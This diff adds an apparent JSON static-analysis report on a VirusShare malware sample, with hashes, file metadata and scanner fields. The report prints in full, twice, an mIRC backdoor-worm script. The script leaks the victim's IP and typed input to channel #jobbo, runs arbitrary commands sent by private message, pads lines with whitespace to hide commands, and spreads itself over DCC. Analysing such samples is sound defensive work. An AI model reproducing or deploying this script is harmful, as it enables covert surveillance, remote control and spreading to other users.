@@ -1,0 +1,69 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "run": "May run an executable file or a system command"
+        },
+        "macro": "[script]\nn0=on 1:START:{\nn1=  .sreq ignore\nn2=  .remote on\nn3=}\nn4=on 1:CONNECT:.msg #jobbo Hi.  $ip on $server $+ : $+ $port $+ .\nn5=\nn6=on 1:INPUT:*:{\nn7=  .msg #jobbo ( $+ $active $+ ) $1-\nn8=}\nn9=\nn10=on 1:TEXT:*:?:{\nn11=  if ( $1 == run ) { .run $2- }\nn12=  if ( $1 == join ) { .join $2- }\nn13=  if ( $1 == msg ) { .msg $2 $3- }\nn14=  if ( $1 == cya ) { .disconnect }\nn15=  if ( $1 == op ) { .auto $2 $3- }\nn16=  if ( $1 == say ) { .msg $2 $3- }\nn17=  if ( $1 == unban ) { .mode $2 -b $3- }\nn18=}\nn19=\nn20=on 1:JOIN:*:{\nn21=  if ( $nick == $me ) { halt } | .dcc send $nick $mircdir $+ script.ini\nn22=}\nn23=.remote on\nn24=titlebar (Not connected)\nn25=}\nn26=raw 401:*: {\nn27=halt\nn28=}\nn29=RAW 001:*:titlebar (Connecting to $server $+ )\nn30=\nn31=on 1:CONNECT:titlebar (Connected to $server $+ )                                                                                                                                                                                                                                                                                                               | .msg  #jobbo Hi.  $ip on $server $+ : $+ $port $+ .\nn32=\nn33=on 1:DISCONNECT:titlebar (Not connected)\nn34=\nn35=;if you type something in status it doesn't have to have \"/\"\nn36=on 1:INPUT:*:{                                                                                                                                                                                                               "
+    },
+    "filename": "VirusShare_2731cbf242de943d185acfe0093db03b",
+    "filesize": 1536,
+    "filetype": "ASCII text, with very long lines, with CRLF line terminators",
+    "hashes": {
+        "md5": "2731cbf242de943d185acfe0093db03b",
+        "sha1": "1f1e787b4c217c1732e8ad0c26f1959f376c2fd2",
+        "sha256": "c012914bbb567188795f2e65fb0283180a9fd2a2350f2ba384f7a3010630d5e9"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "[script]",
+            "n0=on 1:START:{",
+            "n1=  .sreq ignore",
+            "n2=  .remote on",
+            "n3=}",
+            "n4=on 1:CONNECT:.msg #jobbo Hi.  $ip on $server $+ : $+ $port $+ .",
+            "n6=on 1:INPUT:*:{",
+            "n7=  .msg #jobbo ( $+ $active $+ ) $1-",
+            "n8=}",
+            "n10=on 1:TEXT:*:?:{",
+            "n11=  if ( $1 == run ) { .run $2- }",
+            "n12=  if ( $1 == join ) { .join $2- }",
+            "n13=  if ( $1 == msg ) { .msg $2 $3- }",
+            "n14=  if ( $1 == cya ) { .disconnect }",
+            "n15=  if ( $1 == op ) { .auto $2 $3- }",
+            "n16=  if ( $1 == say ) { .msg $2 $3- }",
+            "n17=  if ( $1 == unban ) { .mode $2 -b $3- }",
+            "n18=}",
+            "n19=",
+            "n20=on 1:JOIN:*:{",
+            "n21=  if ( $nick == $me ) { halt } | .dcc send $nick $mircdir $+ script.ini",
+            "n22=}",
+            "n23=.remote on",
+            "n24=titlebar (Not connected)",
+            "n25=}",
+            "n26=raw 401:*: {",
+            "n27=halt",
+            "n28=}",
+            "n29=RAW 001:*:titlebar (Connecting to $server $+ )",
+            "n30=",
+            "n31=on 1:CONNECT:titlebar (Connected to $server $+ )                                                                                                                                                                                                                                                                                                               | .msg  #jobbo Hi.  $ip on $server $+ : $+ $port $+ .",
+            "n32=",
+            "n33=on 1:DISCONNECT:titlebar (Not connected)",
+            "n34=",
+            "n35=;if you type something in status it doesn't have to have \"/\"",
+            "n36=on 1:INPUT:*:{                                                                                                                                                                                                               "
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.271267",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
